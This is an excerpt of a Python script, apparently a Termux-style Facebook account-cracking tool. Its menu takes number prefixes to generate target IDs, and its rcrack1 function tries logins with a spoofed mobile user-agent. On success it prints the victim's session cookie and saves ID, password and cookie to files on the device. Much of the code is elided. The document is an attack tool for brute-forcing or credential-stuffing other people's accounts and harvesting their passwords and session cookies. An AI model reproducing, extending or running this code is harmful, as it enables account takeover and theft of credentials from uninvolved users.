...
class Main:
    def __init__(self):
        ...
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open https://www.facebook.com/7078AARIF')
        if Alif in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    ...
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 9797, 7777, 6536, 9725, 9845, 9977 ')
    ...
    print(' [+] Ids saved in AARIFok.txt, AARIFcp.txt')
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36','viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                print(f" Cookie : {coki}")
                open('/sdcard/AARIF-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n');open('/sdcard/AARIFcookie-OK.txt', 'a').write(cid+' | '+ps+'|'+coki+'\n')
                oks.append(uid)
                break
